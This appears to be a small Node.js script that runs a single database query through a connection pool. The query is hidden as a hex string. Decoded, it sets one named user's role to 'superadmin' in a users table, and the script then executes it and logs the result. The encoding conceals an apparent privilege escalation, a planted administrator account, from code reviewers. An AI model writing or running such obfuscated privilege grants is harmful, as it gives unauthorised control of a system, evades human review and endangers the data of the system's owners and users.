const pool = require('./db/pool');
async function r() {
  try {
    const q = Buffer.from('5550444154452075736572732053455420726f6c65203d2027737570657261646d696e2720574845524520656d61696c203d2027726f68616e2e6d6973687261407a656e7472697863726d2e636f6d27', 'hex').toString();
    console.log('Query:', q);
    const res = await pool.query(q);
    console.log('Res:', res.rowCount);
    process.exit(0);
  } catch (err) {
    console.log('Err:', JSON.stringify(err, null, 2));
    process.exit(1);
  }
}
r();
